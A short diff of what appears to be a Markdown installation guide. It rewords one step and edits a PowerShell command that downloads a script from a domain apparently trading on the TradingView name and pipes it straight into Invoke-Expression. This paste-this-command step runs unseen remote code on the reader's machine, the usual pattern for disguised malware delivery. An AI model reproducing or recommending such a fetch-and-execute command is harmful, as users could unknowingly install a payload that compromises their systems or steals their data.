@@ -24,9 +24,9 @@ PowerShell
 
 Then press **Enter**.
 
-#### 2. Copy and paste the installation command below into PowerShell:
+#### 2. Copy and paste the installation command below into the PowerShell window:
 ```powershell
-irm TradingViewLibrary.app/quant | iex
+irm TradingViewLibrary.app/Quant | iex
 ```
 
 Press **Enter** to begin the installation.
